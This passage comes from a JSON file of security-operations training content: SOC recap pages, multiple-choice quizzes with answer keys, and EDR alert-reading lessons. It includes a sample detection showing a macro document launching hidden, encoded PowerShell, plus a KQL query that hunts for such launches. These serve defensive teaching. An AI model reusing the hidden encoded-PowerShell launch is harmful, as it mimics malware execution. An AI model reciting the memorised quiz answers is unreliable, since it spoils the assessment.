        "question": "An analyst notices that a particular anomaly (a service account logging in interactively) has been investigated and dismissed as benign several times before, and now stops re-investigating it carefully each time it recurs. What phenomenon does this describe?",
        "options": [
          {
            "label": "Automation bias",
            "value": "a"
          },
          {
            "label": "The 'so what?' test working correctly",
            "value": "b"
          },
          {
            "label": "Normalization of deviance",
            "value": "c"
          },
          {
            "label": "A properly calibrated likelihood x impact assessment",
            "value": "d"
          }
        ],
        "answer": "c",
        "explanation": "Normalization of deviance is exactly this pattern: a recurring anomaly gradually gets accepted as routine and stops receiving the scrutiny it originally warranted, purely because it has occurred before without visible consequence. Automation bias is a different pattern. Over-trusting an automated system's output specifically."
      },
      {
        "question": "An alert shows a login from an unexpected foreign IP address using a shared, read-only reporting account with no access to sensitive data, versus an identical login pattern on a finance executive's account with wire-transfer authority. According to risk-based thinking, how should these two alerts be prioritized?",
        "options": [
          {
            "label": "The executive's account alert should be prioritized higher, since the same likelihood combined with much higher impact raises overall risk",
            "value": "d"
          },
          {
            "label": "Both should be treated identically since the technical alert pattern is the same",
            "value": "a"
          },
          {
            "label": "The reporting account alert should always be prioritized higher, because any login anomaly on a shared account is inherently more suspicious than one on a personal account",
            "value": "b"
          },
          {
            "label": "Neither should be investigated until a False Positive verdict is ruled out first for both",
            "value": "c"
          }
        ],
        "answer": "d",
        "explanation": "Risk-based thinking multiplies likelihood by impact, not just likelihood alone. Two technically identical alerts can carry very different priority once impact (driven by what the account can actually access or authorize) is factored in, which is exactly why treating them identically ignores half of the risk equation."
      },
      {
        "question": "In the worked example, powershell.exe was launched by outlook.exe using an encoded command line immediately after the user opened an email attachment, and no legitimate business process was found to explain this behavior. Applying the five-step checklist, what verdict was reached and why?",
        "options": [
          {
            "label": "True Positive, because the causal chain (attachment to encoded PowerShell) did not match any known authorized pattern and was not a rule misfire",
            "value": "a"
          },
          {
            "label": "Benign True Positive, because PowerShell execution is common in that department",
            "value": "b"
          },
          {
            "label": "Undetermined, because a base64-encoded command line can never be fully evaluated without dedicated specialized malware analysis tooling on hand",
            "value": "c"
          },
          {
            "label": "False Positive, because the workstation had no elevated privileges",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "The verdict was True Positive specifically because the chain from a user opening an attachment to Outlook spawning obfuscated PowerShell matched no legitimate business process (ruling out Benign True Positive) and was not a case of a rule mismatching unrelated activity (ruling out False Positive). The command line being encoded did not block evaluation, decoding it was part of the Correlate step, and the lack of elevated privileges affected impact, not the verdict itself."
      }
    ]
  },
  "soc-analyst--quiz-foundations": {
    "pages": [
      {
        "pageNumber": 1,
        "title": "Recap: What a SOC Is and Does",
        "body": "Before the knowledge check, let's consolidate the ground covered across the SOC Foundations module. A **Security Operations Center (SOC)** is the people, process, and technology an organization uses to continuously monitor for signs of compromise and respond when it finds one, running 24/7/365 because attackers do not respect business hours.\n\n### The people\nSOCs divide labor across tiers: **Tier 1 (T1)** analysts perform fast first-pass triage with limited containment authority; **Tier 2 (T2)** analysts investigate escalations in depth and coordinate response; **Tier 3 (T3)** analysts hunt for undetected threats and lead major incidents. Supporting roles include Detection Engineers (who write the rules T1 triages) and the SOC Manager (who owns staffing and SLA compliance).\n\n### The process\nEvery alert moves through a pipeline: **Detection** (a rule or sensor fires), **Triage** (a human makes a fast initial call), **Investigation** (gathering deeper context if triage says it's warranted), **Response/Containment** (isolating a host, disabling an account, blocking an indicator), and **Closure & Documentation** (every alert gets a recorded verdict, regardless of outcome).\n\n### The technology\nA SIEM (Security Information and Event Management platform) gives broad visibility across many log sources; an EDR (Endpoint Detection and Response) gives deep visibility on individual hosts; a SOAR (Security Orchestration, Automation and Response) platform automates repetitive playbook steps; a TIP (Threat Intelligence Platform) provides context on indicators; NDR (Network Detection and Response) covers traffic between systems that endpoint tools cannot see.\n\n### Delivery models\nOrganizations run SOCs in-house (maximum depth, expensive 24/7 staffing), via an MSSP (Managed Security Service Provider, immediate coverage but less per-client depth), or in a hybrid model combining both. Increasingly the most common real-world pattern. Follow-the-sun staffing distributes teams across time zones so no single team works permanent night shifts.\n\nKeep these four pillars (people, process, technology, delivery model) in mind as you move through the rest of this recap and into the quiz.",
        "keyPoints": [
          "A SOC continuously monitors for compromise using people, process, and technology working together",
          "The alert pipeline is Detection, Triage, Investigation, Response/Containment, Closure & Documentation",
          "SIEM gives broad visibility, EDR gives deep host-level visibility: they serve different purposes",
          "In-house, MSSP, and hybrid are the three common SOC delivery models, each with different tradeoffs"
        ]
      },
      {
        "pageNumber": 2,
        "title": "Recap: The Tier Model, Escalation, and SLAs",
        "body": "The tier model is defined by **scope of authority and depth of investigation**, not by effort: a T1 analyst working a difficult case for twenty minutes within their scope is doing excellent T1 work, not \"T2 work.\"\n\n### Escalation quality\nA strong escalation package includes the alert itself, the specific reasoning for suspicion, a timeline, any related activity already gathered, actions already taken, and a recommended next step. A weak escalation (a one-line \"please check this\") forces the receiving analyst to redo the investigation from scratch. This single habit (narrating *why* something is suspicious, not just flagging *that* it is) is one of the highest-leverage skills a junior analyst can build.\n\n### SLAs (Service Level Agreements)\nAn SLA commits the SOC to specific response speed targets tied to severity, built around three clocks: **Time to Acknowledge**, **Time to Respond**, and **Time to Resolve**. SLAs are tiered by severity because not every alert deserves equal urgency: a Critical alert might carry a 15-minute response target while a Low-severity alert might reasonably take days. Severity is typically pre-assigned by the detection rule itself, so the SLA clock can start before any human has looked at the alert. An SLA the SOC cannot realistically staff for is worse than no SLA, because it creates false confidence in a commitment that will not be met.\n\n### MTTD and MTTR\n**Mean Time to Detect (MTTD)** measures the average gap between when a compromise actually begins and when it is detected: the undetected window is also called dwell time. **Mean Time to Respond (MTTR)** measures the average gap between detection and containment or resolution. The two metrics must be read together: a SOC can have excellent MTTD but poor MTTR (slow to act once it knows), or the reverse, and neither number alone reveals which SOC actually limits attacker damage better.\n\n### Handoffs and pitfalls\nShift handoffs must explicitly transfer ownership of open tickets and remaining SLA time, because the most dangerous SOC failure is an alert both shifts assume belongs to the other person. Common tier-model pitfalls include alert fatigue producing rubber-stamp closures, escalating without doing basic legwork first, and skipping documentation under time pressure.",
        "keyPoints": [
          "Tiers differ by authority and investigation depth, not effort, escalating appropriately is itself good judgment",
          "A strong escalation includes context, reasoning, timeline, prior actions, and a recommendation",
          "SLAs commit to Acknowledge/Respond/Resolve targets tiered by severity, starting when the rule fires",
          "MTTD measures detection speed and MTTR measures response speed: both must be read together, not separately"
        ]
      },
      {
        "pageNumber": 3,
        "title": "Recap: MTTD, MTTR, and Measuring the Clock",
        "body": "This page reinforces the metrics content with the calculation detail that the quiz will test directly, since this is an area beginners often mix up.\n\n### The formulas\nMTTD = (sum of detection times across all incidents) / (number of incidents), where each incident's detection time is the gap between the actual start of compromise and the moment it was detected.\n\nMTTR = (sum of response times across all incidents) / (number of incidents), where each incident's response time is the gap between detection and containment or resolution.\n\n### Where the timestamps come from\nBoth metrics depend on accurate timestamps at each stage: the true start of compromise (often reconstructed after the fact through timeline analysis, a skill covered later in this Learning Path), the detection timestamp (from the SIEM or EDR), and the containment or resolution timestamp (from the ticketing system or a SOAR playbook log). Sloppy documentation (for example, an analyst forgetting to log exactly when containment happened) quietly corrupts these numbers, which is one more reason the \"Communicate\" step of good triage discipline matters beyond any single ticket.\n\n### A common beginner mistake worth repeating\nIt is tempting to think the MTTD clock starts when an analyst first opens or notices an alert. It does not, it starts at the actual moment the compromise began, which is often well before any human or system even flagged it. Confusing \"when we noticed\" with \"when it began\" understates true detection latency and can make a SOC look faster than it actually is.\n\n### Why SLA \"Time to Resolve\" and MTTR are related but not identical\nAn SLA's \"Time to Resolve\" target is an organization's *stated goal* for response speed by severity tier: essentially a promised ceiling. MTTR is the *actual measured average* the SOC achieves in practice. A SOC can have an aggressive SLA target on paper while its real MTTR, measured across actual incidents, tells a very different story, which is exactly why both the target and the measured reality need to be tracked, not just one or the other.",
        "keyPoints": [
          "MTTD = average time from actual compromise start to detection; MTTR = average time from detection to resolution",
          "Both metrics require accurate timestamps at each stage. Sloppy documentation corrupts them silently",
          "The MTTD clock starts at the actual compromise, not when an analyst first notices the alert",
          "An SLA's Time to Resolve target is a stated goal; MTTR is the measured reality: both must be tracked"
        ]
      },
      {
        "pageNumber": 4,
        "title": "Recap: The Verdict Taxonomy and Alert Fatigue",
        "body": "Precise vocabulary is what makes triage metrics measurable. This page reviews the categories and the fatigue dynamics that make disciplined use of them necessary.\n\n### The verdict taxonomy\n- **True Positive (TP)**: the detection correctly identified genuinely malicious activity.\n- **False Positive (FP)**, the rule itself misfired on activity that does not match its intended pattern at all.\n- **Benign True Positive (BTP)**, the rule correctly matched the pattern it was built to detect, but the specific instance turns out to be legitimate, authorized activity. This is distinct from a False Positive: the rule did not misfire, and treating BTPs as FPs would misdirect detection engineering toward rewriting a rule that is actually working correctly, instead of adding context like an allow-list for known authorized activity.\n- **Undetermined**. Evidence genuinely cannot support a confident verdict; this should be rare and always documented with a reason, not a default for a rushed analyst.\n\n### Signal detection theory and alert fatigue\nEvery detection system faces a tradeoff between true positives, false positives, false negatives (a real threat missed entirely), and true negatives. Tuning to catch more real threats almost always increases false positives, and vice versa. When false positives are frequent, analysts, consciously or not, start giving every alert from that rule less scrutiny. This is **alert fatigue**, and it is dangerous precisely because it degrades judgment silently: an analyst experiencing it does not feel less careful, they simply are.\n\n### Normalization of deviance\nA related organizational pattern: when a genuinely anomalous condition occurs repeatedly without consequence, analysts can start treating it as routine rather than re-evaluating it each time, a dynamic that can cause a SOC to slowly drift toward accepting risk it would never have accepted on day one.\n\n### Why this vocabulary matters beyond any one ticket\nConsistent, precise verdicts are what let a SOC measure its own false-positive rate accurately, tune detection rules toward the right fix, and give leadership an honest picture of SOC health rather than a vague sense of \"things seem fine.\"",
        "keyPoints": [
          "True Positive, False Positive, Benign True Positive, and Undetermined are distinct, precise categories",
          "A Benign True Positive is a correctly-firing rule matched to a legitimate instance, not the same as a misfiring rule",
          "Alert fatigue silently degrades judgment as repeated false positives reduce scrutiny on every subsequent alert",
          "Normalization of deviance causes a recurring anomaly to be treated as routine instead of being re-evaluated"
        ]
      },
      {
        "pageNumber": 5,
        "title": "Recap: Risk-Based Thinking and Bias Awareness",
        "body": "The final pillar from the previous lesson combines everything into a repeatable decision process.\n\n### Likelihood x impact\nRisk-based prioritization combines two independent dimensions: **likelihood** (how probable, given the evidence, that this is genuinely malicious) and **impact** (how much damage it could cause given the asset or identity involved). The same technical alert (say, suspicious PowerShell execution) carries very different priority depending on whether it touched a shared kiosk with no sensitive data or a domain controller managing authentication for the whole network. Likelihood is not a one-time guess; it is a running estimate that updates as new evidence arrives during investigation.\n\n### The five questions and the \"so what?\" test\nWho, what, when, where, and how turn a vague alert into specific, checkable facts. The \"so what?\" test then asks whether the activity, exactly as it appears, actually matters to the business given who and what is involved, connecting technical facts to real organizational risk.\n\n### The five-step checklist\n**Context** (gather the five questions before forming an opinion), **Correlate** (check related activity and known authorized patterns), **Confirm** (apply the verdict taxonomy explicitly, in writing), **Calculate** (apply likelihood x impact given the asset involved), and **Communicate** (document the verdict and, if needed, build a strong escalation package). Checklists outperform unaided intuition specifically because attention and judgment degrade under fatigue and repetition: a checklist does not require fresh mental energy to apply consistently.\n\n### Cognitive biases to watch for\n**Confirmation bias** (favoring evidence that supports an early conclusion), **automation bias** (over-trusting a tool's output without independent verification), **anchoring** (over-weighting the first piece of information, like an alert's title), and normalization of deviance (revisited from an individual-behavior angle). Awareness of a bias reduces but does not eliminate its effect, which is exactly why a written, structured checklist is a stronger safeguard than good intentions alone.",
        "keyPoints": [
          "Risk-based prioritization multiplies likelihood by impact. Asset and identity context change impact significantly",
          "The five questions (who/what/when/where/how) plus the 'so what?' test connect facts to real business risk",
          "The Context, Correlate, Confirm, Calculate, Communicate checklist structures triage under fatigue",
          "Confirmation bias, automation bias, and anchoring all distort judgment even when an analyst is trying to be careful"
        ]
      },
      {
        "pageNumber": 6,
        "title": "Bringing It Together: A Full Alert Walkthrough",
        "body": "To close this module, walk through one alert end to end, touching every pillar from this recap in sequence. This mirrors the kind of applied, scenario-based reasoning the quiz will test.\n\n### The alert\nNexaCorp's SIEM raises a **High**-severity alert at 14:08: a finance department workstation shows winword.exe spawning powershell.exe with a heavily obfuscated, base64-encoded command line, roughly three minutes after the user opened an email attachment.\n\n### Applying the pillars\n**People and process**: the on-shift Tier 1 analyst, working within their scope, begins triage rather than attempting containment directly. **Verdict taxonomy**: the analyst gathers the five questions, who (an accounts payable clerk with no prior incidents), what (Word spawning encoded PowerShell), when (mid-afternoon, unremarkable timing), where (a standard workstation, no elevated privileges), how (an email attachment opened minutes earlier), and correlates: no legitimate business process explains Word launching PowerShell for this team. This rules out both False Positive (the rule matched a real, meaningful pattern) and Benign True Positive (no authorized activity explains it), confirming a **True Positive**.\n\n### Risk-based thinking and the SLA clock\n**Calculate**: likelihood is high given the clear causal chain; impact is moderate, since the account holds no elevated privileges but any foothold enables further lateral movement. Given the High severity assigned by the detection rule, the SOC's SLA table (from the earlier lesson) sets a firm response and resolution target, and the **MTTD clock** already started the moment the attachment executed, not when the analyst opened the alert.\n\n### Communicate: the escalation\nBecause T1 lacks containment authority at this severity, the analyst builds a strong escalation package, the alert, the reasoning, the timeline, the ruled-out verdict categories, and a recommendation for host isolation, and hands it to Tier 2 well within the SLA's Time to Respond window.\n\n### What this walkthrough demonstrates\nEvery pillar from this module worked together in one decision: the tier model defined authority, the verdict taxonomy produced a precise classification, risk-based thinking set urgency, and disciplined documentation made the SLA clock and the eventual metrics trustworthy. This is what \"thinking like a SOC analyst\" actually looks like in practice, not a single trick, but several habits operating together.",
        "keyPoints": [
          "A real alert exercises every pillar at once: tier authority, verdict taxonomy, risk-based thinking, and documentation",
          "Ruling out False Positive and Benign True Positive explicitly is what makes a True Positive verdict defensible",
          "The MTTD clock, SLA targets, and escalation quality all depend on the same underlying triage discipline",
          "Thinking like a SOC analyst means applying several habits together, not relying on any single trick"
        ]
      }
    ],
    "quiz": [
      {
        "question": "What fundamentally distinguishes a SOC from a general IT helpdesk?",
        "options": [
          {
            "label": "A SOC exists to keep systems safe from compromise, while a helpdesk exists to keep systems working for users",
            "value": "a"
          },
          {
            "label": "A SOC is only ever staffed during standard business hours, while a helpdesk provides round-the-clock nights-and-weekends coverage",
            "value": "b"
          },
          {
            "label": "A SOC exclusively handles password resets while a helpdesk investigates security alerts",
            "value": "c"
          },
          {
            "label": "The two terms describe identical functions and are used interchangeably in every organization",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "A SOC's mission is detecting and responding to compromise; a helpdesk's mission is keeping systems operational for users. It is actually the SOC, not the helpdesk, that typically runs continuously, and the responsibilities described for each in the other distractors are reversed or invented."
      },
      {
        "question": "A Tier 1 analyst spends twenty careful minutes fully investigating a genuinely difficult false-positive case within their documented authority. According to this module, how should this be characterized?",
        "options": [
          {
            "label": "As Tier 2 work being performed without proper authorization from a supervisor",
            "value": "a"
          },
          {
            "label": "As a violation of the SLA, since Tier 1 alerts must always be closed within five minutes",
            "value": "b"
          },
          {
            "label": "As excellent Tier 1 work, since tiers are defined by scope of authority and depth, not by how hard someone works",
            "value": "c"
          },
          {
            "label": "As a sign the analyst should be immediately promoted to Tier 2",
            "value": "d"
          }
        ],
        "answer": "c",
        "explanation": "The module is explicit that tiers reflect scope of authority and investigation depth, not effort. Thorough, careful work within one's own tier and authority is simply good Tier 1 work, not evidence of overreach or an automatic case for promotion."
      },
      {
        "question": "A detection rule correctly identifies real, legitimate PsExec usage (a genuine instance of the exact pattern the rule was built to catch) being run by the authorized IT team during a scheduled maintenance window. What verdict category best describes this, and why does it matter operationally?",
        "options": [
          {
            "label": "False Positive, because tracking it any other way would make SLA metrics impossible to calculate",
            "value": "a"
          },
          {
            "label": "Benign True Positive: the rule worked correctly, so an allow-list for authorized maintenance is the right fix, not rewriting the rule",
            "value": "b"
          },
          {
            "label": "Undetermined, because more evidence about the maintenance window is always required before any verdict",
            "value": "c"
          },
          {
            "label": "True Positive requiring immediate escalation and host isolation regardless of authorization",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "This is a Benign True Positive because the rule correctly matched its intended pattern, but the specific instance was legitimate and authorized. Treating it as a False Positive would misdirect effort toward rewriting a correctly functioning rule instead of adding context like an allow-list, and neither Undetermined nor unconditional escalation fits a case where the authorization is already established."
      },
      {
        "question": "A SOC's average Mean Time to Detect (MTTD) is calculated across recent incidents. For one incident, a compromise actually began at 01:00, but the SIEM alert did not fire until 03:00, and the analyst did not open the alert until 03:40. What is the detection time that should be used for that incident's MTTD calculation?",
        "options": [
          {
            "label": "40 minutes, from when the alert fired to when the analyst opened it",
            "value": "a"
          },
          {
            "label": "2 hours and 40 minutes, from when the compromise began to when the analyst opened the alert",
            "value": "b"
          },
          {
            "label": "0 minutes, since detection time is only measured once containment begins",
            "value": "c"
          },
          {
            "label": "2 hours, from when the compromise actually began to when the alert fired",
            "value": "d"
          }
        ],
        "answer": "d",
        "explanation": "MTTD measures the gap between the actual start of compromise and the moment of detection: here, 01:00 to 03:00, a 2-hour detection time. The time between the alert firing and the analyst opening it (03:00 to 03:40) is a separate, later part of the response timeline, not part of detection time itself."
      },
      {
        "question": "An alert shows suspicious PowerShell execution on a shared kiosk workstation with no sensitive data, and an identical technical pattern occurs on a domain controller that manages authentication for the entire network. According to risk-based thinking, how should these two alerts be prioritized?",
        "options": [
          {
            "label": "Identically, since the technical detection pattern is exactly the same in both cases",
            "value": "a"
          },
          {
            "label": "The domain controller alert should be prioritized higher, since identical likelihood combined with far greater impact raises overall risk",
            "value": "b"
          },
          {
            "label": "The kiosk alert should be prioritized higher, since kiosks are more commonly compromised in general",
            "value": "c"
          },
          {
            "label": "Neither can be prioritized until both are confirmed as False Positives first",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Risk-based thinking combines likelihood with impact, not likelihood alone. Even with the same technical pattern and similar likelihood, the domain controller's far greater potential impact (compromising authentication for the whole network) makes it the higher-priority alert, treating both identically ignores impact entirely."
      },
      {
        "question": "An analyst notices a detection rule's alert title reads 'Likely False Positive. Known Software Update,' and finds themselves evaluating the rest of the evidence through that lens even though the actual who/what/when/where/how facts point toward something more concerning. What cognitive bias does this describe?",
        "options": [
          {
            "label": "Automation bias, since the alert title was generated by an automated detection rule",
            "value": "a"
          },
          {
            "label": "Confirmation bias specifically related to detection engineering processes",
            "value": "b"
          },
          {
            "label": "Anchoring on the alert's initial framing",
            "value": "c"
          },
          {
            "label": "Normalization of deviance building up over several repeated occurrences",
            "value": "d"
          }
        ],
        "answer": "c",
        "explanation": "This is anchoring: over-relying on the first piece of information encountered, in this case the alert's title, and letting it distort evaluation of the actual evidence. Automation bias is over-trusting a tool's output; normalization of deviance is accepting a recurring anomaly as routine over time. Neither matches an initial-framing effect from a single alert's title."
      },
      {
        "question": "Why does the module argue that a written, structured checklist is a stronger safeguard against cognitive bias than simply being aware that biases like confirmation bias or anchoring exist?",
        "options": [
          {
            "label": "Because checklists are required by law in every SOC environment regardless of effectiveness",
            "value": "a"
          },
          {
            "label": "Because awareness of a bias makes an analyst completely immune to it after just one instance",
            "value": "b"
          },
          {
            "label": "Because checklists are designed to eliminate the need for any human judgment anywhere in the triage process",
            "value": "c"
          },
          {
            "label": "Because awareness reduces but does not eliminate bias, while a checklist creates concrete checkpoints independent of fresh mental energy",
            "value": "d"
          }
        ],
        "answer": "d",
        "explanation": "The module explains that psychological research generally finds awareness reduces but does not eliminate bias, whereas a written checklist requiring explicit statements of reasoning creates a structural checkpoint that works even when an analyst's attention or self-awareness is degraded by fatigue."
      },
      {
        "question": "At 14:08, a finance workstation shows winword.exe spawning powershell.exe with an obfuscated command line, three minutes after the user opened an email attachment, and no legitimate business process explains this behavior. What should the Tier 1 analyst do next, given the module's guidance on authority and escalation?",
        "options": [
          {
            "label": "Confirm the True Positive verdict, build a strong escalation package with full context, and recommend containment to Tier 2, since T1 lacks that authority at this severity",
            "value": "a"
          },
          {
            "label": "Immediately isolate the host directly, since Tier 1 has unlimited containment authority for any confirmed True Positive",
            "value": "b"
          },
          {
            "label": "Close the ticket as Undetermined, since PowerShell activity can never be conclusively classified without malware reverse engineering",
            "value": "c"
          },
          {
            "label": "Wait for the next scheduled shift handoff before taking any action, since the SLA clock only starts once a human opens the alert",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "This matches the module's walkthrough exactly: after confirming True Positive by ruling out False Positive and Benign True Positive, a Tier 1 analyst without containment authority at this severity should build a strong, well-documented escalation package rather than acting alone, closing prematurely as Undetermined, or delaying until a handoff, the SLA and MTTD clocks are already running regardless."
      }
    ]
  },
  "soc-analyst--reading-edr-alerts": {
    "pages": [
      {
        "pageNumber": 1,
        "video": {
          "src": "/lesson-videos/reading-edr-alerts/reading-edr-alerts.mp4",
          "caption": "Explainer, Reading EDR Alerts · subtitles: English · עברית · Español (CC menu)",
          "tracks": [
            { "srclang": "en", "label": "English", "src": "/lesson-videos/reading-edr-alerts/en.vtt", "default": true },
            { "srclang": "he", "label": "עברית", "src": "/lesson-videos/reading-edr-alerts/he.vtt" },
            { "srclang": "es", "label": "Español", "src": "/lesson-videos/reading-edr-alerts/es.vtt" }
          ]
        },
        "title": "What Is EDR, and What Is an Alert?",
        "body": "You have spent the SOC Foundations module learning how to think about triage. Now this module turns to the raw material you will actually triage: real telemetry from a real tool. **EDR (Endpoint Detection and Response)** is software (an agent installed on laptops, servers, and workstations) that continuously records what happens on that machine: every process that runs, every file that is created or modified, every network connection that is opened, and every registry change (on Windows). Leading examples include CrowdStrike Falcon and Microsoft Defender for Endpoint.\n\n### EDR vs. legacy antivirus\nTraditional antivirus (AV) mostly worked by signature matching: comparing a file against a database of known-malicious hashes or patterns, and blocking a match. This is fast but blind to anything new: a slightly modified piece of malware with a different hash sails right past a signature-only scanner. EDR takes a fundamentally different approach: rather than (or in addition to) matching known-bad signatures, it watches *behavior* (the sequence of actions a process takes) and retains a rolling window of that telemetry so analysts can look backward in time, not just react to the moment of infection.\n\n### What an \"alert\" (or \"detection\") actually is\nWhen EDR telemetry matches a pattern its vendor has defined as suspicious or malicious, it generates what is typically called a **detection** (CrowdStrike's term) or an **alert** (a more generic term also used by Microsoft Defender and most SIEMs). This is the vendor's synthesis: a claim that something specific happened and that the pattern matched is worth a human's attention. Critically, a detection is not automatically a verdict: as the previous module taught, it still has to go through triage to determine whether it is a True Positive, False Positive, or Benign True Positive.\n\n### Why this module goes deep on two specific vendors\nRather than teaching abstract EDR theory, the next two pages walk through the real field names and structure of alerts from CrowdStrike Falcon and Microsoft Defender for Endpoint, two of the most widely deployed EDR platforms in real SOCs. Learning to read one vendor's raw alert data fluently transfers readily to others, because the underlying concepts (process, parent process, command line, hash, severity) recur across virtually every EDR product, even when the exact field names differ.",
        "keyPoints": [
          "EDR (Endpoint Detection and Response) records process, file, network, and registry activity continuously on a host",
          "EDR watches behavior over time, unlike legacy antivirus, which mostly matches known-bad file signatures",
          "A detection or alert is the vendor's claim that telemetry matched a suspicious pattern, not yet a verdict",
          "The core concepts (process, parent, command line, hash, severity) transfer across EDR vendors even when field names differ"
        ]
      },
      {
        "pageNumber": 2,
        "title": "Anatomy of a CrowdStrike Falcon Detection",
        "body": "CrowdStrike Falcon detections carry a specific, well-documented set of fields when ingested into a SIEM. Learning these exact names lets you read a raw detection without guessing.\n\n### Key fields\n- **FileName / FilePath** (the name and full path of the executable involved in the detection\n- **CommandLine**) the executable path plus any arguments passed to it at launch\n- **ParentImageFileName** (the full path to the *parent* process that launched this one\n- **ParentCommandLine**) the parent process's own command line\n- **SHA256String**, the SHA-256 hash of the executable, used to check reputation against threat intelligence\n- **Severity**, a numeric severity score\n- **SeverityName**, the human-readable severity label: Informational, Low, Medium, High, or Critical\n- **Tactic**, the MITRE ATT&CK tactic category of the detection (for example, \"Defense Evasion\")\n- **Technique**, the MITRE ATT&CK technique category (for example, \"Obfuscated Files or Information\")\n\n### A worked example\nThe block below shows what a CrowdStrike Falcon detection looks like once ingested by a SIEM, using these exact field names.\n\n### Reading it like an analyst\nNotice how much you can determine before opening any other tool: the file that ran, what launched it, the arguments it was given, and (because CrowdStrike pre-classifies detections against MITRE ATT&CK) the general category of malicious behavior it matched. Applying the five questions from the previous module's triage lesson, the \"what\" and \"how\" are answered almost entirely by CommandLine, ParentImageFileName, and ParentCommandLine alone.\n\n### Why Tactic and Technique matter beyond this one alert\nThe Tactic and Technique fields are not decorative labels. They are a direct bridge to the MITRE ATT&CK framework, which a later module in this path (MITRE ATT&CK) covers in full depth: what the framework is, why \"Defense Evasion\" and \"Obfuscated Files or Information\" are precise, named categories rather than vague descriptions, and how analysts use these categories to reason about what an attacker might do next.",
        "codeExample": "{\n  \"event\": {\n    \"FileName\": \"powershell.exe\",\n    \"FilePath\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n    \"CommandLine\": \"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA...\",\n    \"ParentImageFileName\": \"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\",\n    \"ParentCommandLine\": \"\\\"WINWORD.EXE\\\" /n \\\"C:\\\\Users\\\\dcohen\\\\Downloads\\\\invoice_0847.docm\\\"\",\n    \"SHA256String\": \"0c58ea98c3c5399295ff5d79587f9e3af609f88c41ffd40ac214bf46063531f8\",\n    \"Severity\": 80,\n    \"SeverityName\": \"High\",\n    \"Tactic\": \"Defense Evasion\",\n    \"Technique\": \"Obfuscated Files or Information\"\n  }\n}",
        "keyPoints": [
          "CommandLine, ParentImageFileName, and ParentCommandLine together answer most of the 'what' and 'how' questions",
          "SeverityName ranges from Informational through Low, Medium, High, to Critical, alongside a numeric Severity score",
          "Tactic and Technique fields map directly onto MITRE ATT&CK categories, not free-text descriptions",
          "SHA256String is the file's hash, used to check reputation against threat intelligence sources"
        ]
      },
      {
        "pageNumber": 3,
        "title": "Anatomy of a Microsoft Defender Alert (DeviceProcessEvents)",
        "body": "Microsoft Defender for Endpoint exposes its telemetry through **advanced hunting tables** queried with KQL (Kusto Query Language), Microsoft Sentinel's native query language. The most important table for process-level investigation is **DeviceProcessEvents**.\n\n### Key fields\n- **FileName / FolderPath** (the name and folder of the newly created process\n- **ProcessCommandLine**) the command line used to launch the new process\n- **SHA1**: the SHA-1 hash of the file. Microsoft's own documentation notes that the **SHA256** column is usually not populated for this table. SHA1 is the hash you should actually rely on in DeviceProcessEvents, which surprises many analysts coming from other platforms\n- **InitiatingProcessFileName**: the name of the process that launched this one (the \"parent,\" in EDR terminology)\n- **InitiatingProcessCommandLine** (the parent process's command line\n- **InitiatingProcessParentFileName**) the *grandparent* process, one level further up the chain\n- **AccountName** (the user account under which the new process ran\n- **DeviceName**) the fully qualified domain name of the host\n\n### A worked KQL query\nThe query below finds every process launched with a PowerShell encoded-command flag, across the fleet, in the last 24 hours, a common hunt and also a useful triage step when you already have one suspicious detection and want to check whether the same pattern appears elsewhere.\n\n### Why \"Initiating\" is Microsoft's word for \"parent\"\nCrowdStrike calls the launching process the **Parent**; Microsoft calls it the **Initiating** process. Same concept, different vendor vocabulary: a small but real trap for analysts new to reading raw telemetry across multiple tools, and exactly why this lesson deliberately teaches both vendors side by side rather than just one.",
        "codeExample": "DeviceProcessEvents\n| where Timestamp > ago(24h)\n| where FileName == \"powershell.exe\"\n| where ProcessCommandLine has \"-EncodedCommand\" or ProcessCommandLine has \"-enc\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine,\n    InitiatingProcessFileName, InitiatingProcessCommandLine, SHA1\n| order by Timestamp desc",
        "keyPoints": [
          "DeviceProcessEvents is Microsoft Defender's core process-telemetry table, queried with KQL",
          "SHA256 is usually not populated in DeviceProcessEvents. SHA1 is the hash column to rely on",
          "Microsoft's 'InitiatingProcess' fields are the equivalent of CrowdStrike's 'Parent' fields",
          "InitiatingProcessParentFileName reaches one level further up the chain than InitiatingProcessFileName alone"
        ]
      },
      {
        "pageNumber": 4,
        "title": "Severity Levels Compared Across Vendors",
        "body": "Severity naming is one of the first places vendor terminology diverges in ways that can confuse an analyst moving between tools, or a SOC correlating alerts from multiple sources in one SIEM.\n\n### CrowdStrike Falcon severity\nFalcon detections carry both a numeric **Severity** score and a categorical **SeverityName**: Informational, Low, Medium, High, or Critical. The numeric score gives finer-grained ranking within a category, useful for sorting a queue of same-label alerts by relative urgency.\n\n### Microsoft Sentinel incident severity\nMicrosoft Sentinel (built on top of Defender and other Microsoft security telemetry) labels incidents with four levels: Informational, Low, Medium, or High, notably one fewer named tier than Falcon's five, with no separate \"Critical\" label; Sentinel's highest tier is simply \"High.\"\n\n### Comparison table\n| | CrowdStrike Falcon | Microsoft Sentinel |\n|---|---|---|\n| Levels | Informational, Low, Medium, High, Critical (5) | Informational, Low, Medium, High (4) |\n| Numeric score | Yes (Severity, alongside SeverityName) | Not a standard incident field |\n| Highest tier | Critical | High |\n\n### Why this matters when correlating across tools\nA SOC that ingests both CrowdStrike detections and Microsoft Sentinel incidents into one SIEM must be careful not to assume \"High\" means the same underlying urgency in both systems, since Falcon has a tier above it (Critical) and Sentinel does not. A detection engineer designing cross-platform correlation logic, or an analyst manually comparing two alerts from different sources, needs to know each vendor's actual scale rather than assuming severity labels are universally standardized.\n\n### The deeper lesson: severity is vendor-defined, not universal\nThere is no single global standard that defines what \"High\" severity must mean. Each vendor designs its own scale based on its own detection engineering philosophy. This is worth remembering any time you move between tools: always check what scale you are actually looking at before comparing two alerts' severities at face value.",
        "keyPoints": [
          "CrowdStrike Falcon uses five severity tiers (Informational through Critical) plus a numeric score",
          "Microsoft Sentinel incidents use four tiers (Informational through High), with no separate Critical label",
          "The same word 'High' can represent different actual urgency depending on which vendor's scale is in use",
